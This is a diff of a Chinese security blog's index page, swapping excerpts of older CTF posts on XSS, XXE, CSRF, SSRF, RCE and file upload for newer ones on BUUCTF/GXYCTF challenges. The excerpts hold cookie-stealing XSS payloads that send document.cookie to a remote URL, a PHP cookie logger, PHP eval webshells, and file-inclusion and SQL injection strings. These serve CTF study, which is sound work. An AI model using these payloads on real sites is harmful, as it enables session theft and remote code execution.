@@ -204,15 +204,15 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">89</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
-    <div class="sidebar-state-number">3</div>
+    <div class="sidebar-state-number">4</div>
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">35</div>
+    <div class="sidebar-state-number">66</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -272,29 +272,37 @@
     <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/02/19/CTFSHOW-XSS/" aria-label="CTFSHOW-XSS"></a>
+      <a class="post-link" href="/2025/03/26/%5BGXYCTF2019%5D%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/" aria-label="[GXYCTF2019]禁止套娃"></a>
     
     
     <div class="post-cover-left">
       
-        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="CTFSHOW-XSS" class="lazyload">
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="[GXYCTF2019]禁止套娃" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-19</span>
-        <span><span class="icon-pencil"></span>2.1k 字</span>
-        <span><span class="icon-clock"></span>8 分钟</span>
+        <span><span class="icon-calendar"></span>2025-03-26</span>
+        <span><span class="icon-pencil"></span>681 字</span>
+        <span><span class="icon-clock"></span>2 分钟</span>
       </div>
-      <h2 class="post-title">CTFSHOW-XSS</h2>
+      <h2 class="post-title">[GXYCTF2019]禁止套娃</h2>
       <article class="post-article">
         
-           反射型xss
- WEB316(无过滤)
-在服务器上放一个接受cookie的文件xss.php
-1234567&amp;lt;?php	$cookie = $_GET[&amp;#x27;cookie&amp;#x27;];	$time = date(&amp;#x27;Y-m-d h:i:s&amp;#x27;, time());	$log = fopen(&amp;quot;cookie.txt&amp;quot;, &amp;quot;a&amp;quot;);	fwrite($log,$time.&amp;#x27;:    &amp;#x27;. $cookie . &amp;quot;\n&amp;quot;);	fclose($log);?&amp;gt;
-payload:
-1&amp;lt;sc
+            考察知识点：
+12git泄露无参
+
+
+ 进入题目
+搜查源码，抓包，或者用dirsearch搜都没有发现任何东西
+我们用GitHack查看一下是不是源码泄露
+1python GitHack.py http://4bb4b91d-be9c-4a85-943f-3e68a9e33e62.node5.buuoj.cn:81/.git
+
+发现了一个index.php
+打开一看
+代码审计…
+
+1234567891011121314151617181920212223242526272829&amp;lt;?phpinclude &amp;quot;flag.php&amp;quot;; echo &amp;quot;flag在哪里呢
         
       </article>
     </div>
@@ -304,61 +312,56 @@ payload:
     <div class="post-wrapper">
   <div class="post-wrap-right" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/02/18/CTFSHOW-XXE/" aria-label="CTFSHOW-XXE"></a>
+      <a class="post-link" href="/2025/03/25/%5BBUUCTF%202018%5DOnline%20Tool/" aria-label="[BUUCTF 2018]Online Tool"></a>
     
     
     <div class="post-cover-right">
       
-        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="CTFSHOW-XXE" class="lazyload">
+        
+        
+          <img data-src="../images/124691006_p0_master1200.jpg" data-sizes="auto" alt="[BUUCTF 2018]Online Tool" class="lazyload">
+        
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-18</span>
-        <span><span class="icon-pencil"></span>769 字</span>
+        <span><span class="icon-calendar"></span>2025-03-25</span>
+        <span><span class="icon-pencil"></span>597 字</span>
+        <span><span class="icon-clock"></span>2 分钟</span>
+      </div>
+      <h2 class="post-title">[BUUCTF 2018]Online Tool</h2>
+      <article class="post-article">
+        
+           又是代码审计
+123456789101112131415161718&amp;lt;?phpif (isset($_SERVER[&amp;#x27;HTTP_X_FORWARDED_FOR&amp;#x27;])) &amp;#123;    $_SERVER[&amp;#x27;REMOTE_ADDR&amp;#x27;] = $_SERVER[&amp;#x27;HTTP_X_FORWARDED_FOR&amp;#x27;];&amp;#125;if(!isset($_GET[&amp;#x27;host&amp;#x27;])) &amp;#123;    highlight_file(__FILE__);&amp;#125; else &amp;#123;    $host = $_GET[
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/25/%5BBJDCTF2020%5DZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/" aria-label="[BJDCTF2020]ZJCTF，不过如此"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="[BJDCTF2020]ZJCTF，不过如此" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-25</span>
+        <span><span class="icon-pencil"></span>797 字</span>
         <span><span class="icon-clock"></span>3 分钟</span>
       </div>
-      <h2 class="post-title">CTFSHOW-XXE</h2>
+      <h2 class="post-title">[BJDCTF2020]ZJCTF，不过如此</h2>
       <article class="post-article">
         
-           什么是xxe？
-XXE漏洞（XML外部实体注入）是一种安全漏洞，可以利用输入验证不严格的 XML 解析器来注入恶意代码。攻击者可以通过构造恶意的 XML 文档将其发送到应用程序中，在解析该文档时，XML 解析器会加载外部实体（如文件、URL等），以便在文档中引用它们。攻击者可以利用这个功能来执行各种攻击，例如读取服务器上的任意文件、发送内部网络请求、绕过身份验证等。
-有点像SSRF
-PHP 默认使用 libxml 来解析 XML，但是从 libxml 2.9.0 开始，它默认不再解析外部实体，导致 PHP 下的 XXE 漏洞已经逐渐消失，除非你指定 LIBLXML_NOENT 去开启外部实体
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/02/17/Csrf/" aria-label="Csrf"></a>
-    
-    
-    <div class="post-cover-left">
-      
-        <img data-src="/../images/126839103p0master1200.jpg" data-sizes="auto" alt="Csrf" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-17</span>
-        <span><span class="icon-pencil"></span>1.5k 字</span>
-        <span><span class="icon-clock"></span>5 分钟</span>
-      </div>
-      <h2 class="post-title">Csrf</h2>
-      <article class="post-article">
-        
-           XSS与csrf对比
-xss：攻击者发现XSS漏洞——构造代码——发送给受害人——受害人打开——攻击者获取受害人的cookie——完成攻击
-csrf：攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击
-XSS容易发现，因为攻击者需要登陆后台完成攻击，管理员可以看到日志发现攻击者；而CSRF的攻击是管理员自己实现的，攻击者只负责构造代码。
-CSRF属于业务逻辑漏洞，服务器信任经过身份认证的用户
-XSS属于技术漏洞，客户信任服务器
- Csrf(跨站请求伪造)攻击思想
-攻击者诱使在一个网站上已经登录的用户在另一个网站上执行未授权的操作（例如，转账、修改个
+           题目源码：
+1234567891011121314151617&amp;lt;?phperror_reporting(0);$text = $_GET[&amp;quot;text&amp;quot;];$file = $_GET[&amp;quot;file&amp;quot;];if(isset($text)&amp;amp;&amp;amp;(file_get_contents($text,&amp;#x27;r&amp;#x27;)===&amp;quot;I have a dream&amp;quot;))&amp;#123;    echo &amp;quot;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;&amp;quot;.file_get_contents($text,&amp;#x27;r&amp;#x
         
       </article>
     </div>
@@ -368,25 +371,39 @@ XSS属于技术漏洞，客户信任服务器
     <div class="post-wrapper">
   <div class="post-wrap-right" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/02/16/CTFSHOW%E4%B9%8BSSRF/" aria-label="CTFSHOW之SSRF"></a>
+      <a class="post-link" href="/2025/03/25/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5Dphpweb/" aria-label="[网鼎杯 2020 朱雀组]phpweb"></a>
     
     
     <div class="post-cover-right">
       
-        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="CTFSHOW之SSRF" class="lazyload">
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="[网鼎杯 2020 朱雀组]phpweb" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-16</span>
-        <span><span class="icon-pencil"></span>1.7k 字</span>
-        <span><span class="icon-clock"></span>7 分钟</span>
+        <span><span class="icon-calendar"></span>2025-03-25</span>
+        <span><span class="icon-pencil"></span>574 字</span>
+        <span><span class="icon-clock"></span>2 分钟</span>
       </div>
-      <h2 class="post-title">CTFSHOW之SSRF</h2>
+      <h2 class="post-title">[网鼎杯 2020 朱雀组]phpweb</h2>
       <article class="post-article">
         
-           web入门351(无过滤)
-1234567891011&amp;lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&amp;#x27;url&amp;#x27;];$ch=curl_init($url);//初始化 cURL 会话curl_setopt($ch, CURLOPT_HEADER, 0);//启用时会将头文件的信息作为数据流输出。curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。$result=curl_exec($c
+           进入题目页面后
+没发现任何东西
+但我们查看源码，发现有两个隐藏的输入框，都是用post传参的
+一个是p一个是func
+我们打开hackbar
+
+发现这两个已经传参了
+我们根据func的名字，推测func是函数，p为func的参数
+我们来实验一下
+
+果然被回显了
+那我们就可以用它尝试着去读取文件或命令执行了
+system等命令执行函数都被过滤了
+试了一下，好像只有highlight_file和file_get_contents能用
+我们用file_get_contents查看index.php的源码
+12345678910111213141516171819202122232425262728
         
       </article>
     </div>
@@ -396,40 +413,40 @@ XSS属于技术漏洞，客户信任服务器
     <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/02/14/ssrf/" aria-label="Ssrf"></a>
+      <a class="post-link" href="/2025/03/24/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DFakebook/" aria-label="[网鼎杯 2018]Fakebook"></a>
     
     
     <div class="post-cover-left">
       
-        
-        
-          <img data-src="../images/124691006_p0_master1200.jpg" data-sizes="auto" alt="Ssrf" class="lazyload">
-        
+        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="[网鼎杯 2018]Fakebook" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-14</span>
-        <span><span class="icon-pencil"></span>4.7k 字</span>
-        <span><span class="icon-clock"></span>20 分钟</span>
+        <span><span class="icon-calendar"></span>2025-03-24</span>
+        <span><span class="icon-pencil"></span>518 字</span>
+        <span><span class="icon-clock"></span>2 分钟</span>
       </div>
-      <h2 class="post-title">Ssrf</h2>
+      <h2 class="post-title">[网鼎杯 2018]Fakebook</h2>
       <article class="post-article">
         
-           简介
-SSRF (Server-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统(正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统)。
-即利用服务器的权限去请求一些其他的非法内容
-借鉴：
-SSRF全详解-CSDN博客
- 危害
-能扫描内部网络，获取端口，服务信息。
-攻击运行在内网或本地的应用程序。
-对内网web进行指纹识别
-对内部主机和端口发送请求包进行攻击
-file协议读取本地文件
- 相关函数
- file_get_contents()
-可以读取本
+           
+这个题我看到有登录和注册还以为是sql注入，但发现根本注不了
+那就先登录进去看看吧
+
+进来之后发现no可以注入
+1230 union/**/select 1,(查询语句),3,4#//union select连在一起会被过滤，用/**/分开//查询结果只能在2处回显
+
+但经过我一顿查询
+发现毛都没有
+注意看，这里的data字段存放的是序列化字符串(后面要考)
+
+根据题解思路，说看robots.txt
+我们访问一下
+
+发现一个备份文件，我们下载下来访问
+发现一堆代码
+123456789101112131415161718192021222324252627282930313233343536
         
       </article>
     </div>
@@ -439,48 +456,26 @@ file协议读取本地文件
     <div class="post-wrapper">
   <div class="post-wrap-right" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/02/12/RCE/" aria-label="RCE"></a>
+      <a class="post-link" href="/2025/03/23/CTFSHOW-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" aria-label="CTFSHOW-php反序列化"></a>
     
     
     <div class="post-cover-right">
       
-        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="RCE" class="lazyload">
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="CTFSHOW-php反序列化" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-12</span>
-        <span><span class="icon-pencil"></span>984 字</span>
-        <span><span class="icon-clock"></span>4 分钟</span>
+        <span><span class="icon-calendar"></span>2025-03-23</span>
+        <span><span class="icon-pencil"></span>2.7k 字</span>
+        <span><span class="icon-clock"></span>15 分钟</span>
       </div>
-      <h2 class="post-title">RCE</h2>
+      <h2 class="post-title">CTFSHOW-php反序列化</h2>
       <article class="post-article">
         
-           代码执行函数
- (1) eval()
+          123456789__construct()//当一个对象创建时被调用__destruct() //当一个对象销毁时被调用__toString() //当一个对象被当作一个字符串使用__sleep()//在对象在被序列化之前运行__wakeup()//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)__get()//获得一个类的成员变量时调用__set()//设置一个类的成员变量时调用__invoke()//调用函数的方式调用一个对象时的回应方法__call()//当调用一个对象中的不能用的方法的时候就会执行这个函数
 
-
-功能: 将字符串作为 PHP 代码执行。
-
-
-风险: 如果用户输入直接传递给 eval()，攻击者可以执行任意代码。
-
-
-示例:
-  12$code = $_GET[&amp;#x27;code&amp;#x27;]; // 用户输入eval($code); // 危险！用户可以注入恶意代码
-
-
- (2) assert()
-
-
-功能: 用于调试断言，但如果传入字符串，会将其作为 PHP 代码执行。
-
-
-风险: 在 PHP 7.0 之前，assert() 可以执行代码。
-
-
-示例:
-  12$value = $_GET[&amp;#x27;value&amp;#x27;]; // 用
+web254(代码审计)123456789101112131
         
       </article>
     </div>
@@ -490,33 +485,92 @@ file协议读取本地文件
     <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/02/03/XSS-payload%E6%9E%84%E9%80%A0/" aria-label="XSS-payload构造"></a>
+      <a class="post-link" href="/2025/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" aria-label="文件上传绕过姿势"></a>
     
     
     <div class="post-cover-left">
       
-        <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="XSS-payload构造" class="lazyload">
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="文件上传绕过姿势" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-03</span>
+        <span><span class="icon-calendar"></span>2025-03-23</span>
+        <span><span class="icon-pencil"></span>471 字</span>
+        <span><span class="icon-clock"></span>2 分钟</span>
+      </div>
+      <h2 class="post-title">文件上传绕过姿势</h2>
+      <article class="post-article">
+        
+          短标签1234567891011&amp;lt;?php eval($_POST[&amp;#x27;a&amp;#x27;]) ?&amp;gt;&amp;lt;?php assert(@$_POST[&amp;#x27;a&amp;#x27;]); ?&amp;gt;&amp;lt;?=eval($_POST[1]);?&amp;gt;&amp;lt;?=eval($_POST&amp;#123;1&amp;#125;);?&amp;gt;&amp;lt;?=system(&amp;#x27;tac ../f*&amp;#x27;)?&amp;gt;&amp;lt;?=`tac ../f*`?&amp;gt;
+
+
+
+123456789101112131415161718&amp;lt;?php$fun = create_function(&amp;#x27;&amp;#
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/22/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5DAreUSerialz/" aria-label="[网鼎杯 2020 青龙组]AreUSerialz"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="[网鼎杯 2020 青龙组]AreUSerialz" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-22</span>
+        <span><span class="icon-pencil"></span>478 字</span>
+        <span><span class="icon-clock"></span>2 分钟</span>
+      </div>
+      <h2 class="post-title">[网鼎杯 2020 青龙组]AreUSerialz</h2>
+      <article class="post-article">
+        
+           题目源码：
+1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677&amp;lt;?phpinclude(&amp;quot;flag.php&amp;quot;);highlight_file(__FILE__);class FileHandler &amp;#123;    protected $op;    protected $filename;    protected $cont
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/21/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" aria-label="CTFSHOW-文件包含"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="CTFSHOW-文件包含" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-21</span>
         <span><span class="icon-pencil"></span>3.1k 字</span>
         <span><span class="icon-clock"></span>14 分钟</span>
       </div>
-      <h2 class="post-title">XSS-payload构造</h2>
+      <h2 class="post-title">CTFSHOW-文件包含</h2>
       <article class="post-article">
         
-          黑客是如何获取你账号密码的
+           说明：
+前几题举图示例
+后面由于感官问题就不列图了
+web78(无过滤)123456if(isset($_GET[&amp;#x27;file&amp;#x27;]))&amp;#123;    $file = $_GET[&amp;#x27;file&amp;#x27;];    include($file);&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125;
 
- 漏洞利用：
-1.盗取cookie：
-&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;
-2.构造页面跳转：
-&amp;lt;script&amp;gt;location=&#39;https://www.hacker.com&#39;&amp;lt;/script&amp;gt;
-3.构造获取cookie并发送到远程主机：
-1&amp;lt;script&amp;gt;document.location=&amp;#x27;http://127.0.0.1/test/cookie.phpcookie=&amp;#x27;+document.cookie&amp;lt;/script&amp;gt;
- 常见
+
+我们先用data伪协议来查看flag在哪个文件中
+1?file=data://text/plain,&amp;lt;?php system(&amp;#x27;ls&amp;#x27;);?&amp;gt;
+
+发现是flag.php，那我们直接用d
         
       </article>
     </div>
@@ -526,109 +580,33 @@ file协议读取本地文件
     <div class="post-wrapper">
   <div class="post-wrap-right" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/02/01/%E5%91%BD%E4%BB%A4%E5%9F%BA%E7%A1%80/" aria-label="Linux基础操作"></a>
+      <a class="post-link" href="/2025/03/16/%5BGXYCTF2019%5DBabySQli/" aria-label="[GXYCTF2019]BabySQli"></a>
     
     
     <div class="post-cover-right">
       
-        
-        
-          <img data-src="../images/1737907114de8a.jpg" data-sizes="auto" alt="Linux基础操作" class="lazyload">
-        
+        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="[GXYCTF2019]BabySQli" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-01</span>
-        <span><span class="icon-pencil"></span>5.3k 字</span>
-        <span><span class="icon-clock"></span>20 分钟</span>
+        <span><span class="icon-calendar"></span>2025-03-16</span>
+        <span><span class="icon-pencil"></span>408 字</span>
+        <span><span class="icon-clock"></span>1 分钟</span>
       </div>
-      <h2 class="post-title">Linux基础操作</h2>
+      <h2 class="post-title">[GXYCTF2019]BabySQli</h2>
       <article class="post-article">
         
           
-linux主要特征 ：一切皆文件（目录、硬盘等都是文件）；硬件都在/dev 目录，如硬盘、U盘为/dev/sd[a-d]； /dev/sr0（/dev/cdrom）是光驱的设备名（df命令查看），为设备文件，代表的是光驱本身，得把这个设备挂载到目录下（一般为/mnt）(文件系统的临时挂载点)，才能对设备上的文件进行读写等操作；
-不懂的命令 ：man 命令（查用法、全称），只记得关键词，可用man -k 关键词；
+这一看就是一个sql注入题
+我们先来试过滤
+1234name=1&amp;#x27;=#-&amp;gt;被过滤name=1&amp;#x27;( -&amp;gt;被过滤name=1&amp;#x27;) -&amp;gt;被过滤可知=，（，）都被过滤了
 
- 系统操作：
-1234567891011示例：root@app00:~# root    //用户名，root为超级用户@       //分隔符app00   //主机名称~  
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/01/25/ISCC2016%20Easy%20Gallery/" aria-label="ISCC2016 Easy Gallery"></a>
-    
-    
-    <div class="post-cover-left">
-      
-        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="ISCC2016 Easy Gallery" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-01-25</span>
-        <span><span class="icon-pencil"></span>244 字</span>
-        <span><span class="icon-clock"></span>1 分钟</span>
-      </div>
-      <h2 class="post-title">ISCC2016 Easy Gallery</h2>
-      <article class="post-article">
-        
-          题目链接：Navbar Template for Bootstrap
-进入题目，先上传一个webshell试试
-&amp;lt;?php @eval($_POST[&#39;mima&#39;])?&amp;gt;
-
-但无论怎么尝试都会回显只能上传jpg和gif图片
-我们猜测只能上传图片马
-先制作一个gif图片马,上传
-
-上传成功了，告诉了我们图片id
-那接下来呢？
-
-view了也只是给我们看看奶龙动图，我们去网页源码找答案
-
-当我们在view页面点击submit时，给我们显示了一行路径，不用想，这就是我们上传之后文件所处路径
-这直接考到了我们文件包含的知识
-
-而数据又是以GET传参的，直接输入
-http://web.jar
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/01/23/buuctf-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Upload/" aria-label="buuctf[极客大挑战]Upload"></a>
-    
-    
-    <div class="post-cover-right">
-      
-        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="buuctf[极客大挑战]Upload" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-01-23</span>
-        <span><span class="icon-pencil"></span>444 字</span>
-        <span><span class="icon-clock"></span>1 分钟</span>
-      </div>
-      <h2 class="post-title">buuctf[极客大挑战]Upload</h2>
-      <article class="post-article">
-        
-          这是一个文件上传漏洞
-
-一开始我是选择了&amp;lt;?php@eval(_POST[&#39;mima&#39;])?&amp;gt;的yijuhua.php文件进行上传，告诉我Not image(上传错误)
-将后缀改为jpg，改Content-Type: image/jpg，回显说存在&amp;lt;?
-我们将yijuhua.php内容改为没有&amp;lt;?的一句话木马&amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt; @eval($_POST[&#39;mima&#39;]); &amp;lt;/script&amp;gt;，再次上传，还是上传失败
-我们将文件名修改为yijuhua.phtml，绕过常规php文件后缀检测
-将文件类型
+那肯定不是寻常的sql注入了，因为括号都没了，还注啥呀
+到这里也是不知道办法
+题解说看源码
+源码里有用的就这些
+1234567891011121314151617181920212223242526272829303132333435363738&amp;lt;?phprequire &amp;quot;config.php&amp;quot;;require &amp;quot;flag.php&amp;quot;;$n
         
       </article>
     </div>
@@ -639,7 +617,7 @@ http://web.jar
 
   <nav id="page-nav" data-aos="fade-up">
     
-    <a class="extend prev" rel="prev" href="/page/4/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/6/">下一页 &raquo;</a>
+    <a class="extend prev" rel="prev" href="/page/4/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/6/">下一页 &raquo;</a>
   </nav>
 
 
@@ -668,10 +646,10 @@ http://web.jar
     
       <div>
         <span class="icon-brush"></span>
-        91.7k
+        120.8k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        06:19
+        08:20
       </div>
     
     
@@ -707,15 +685,15 @@ http://web.jar
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">89</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
-    <div class="sidebar-state-number">3</div>
+    <div class="sidebar-state-number">4</div>
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">35</div>
+    <div class="sidebar-state-number">66</div>
   </div>
 </div>
 <div class="sidebar-social">
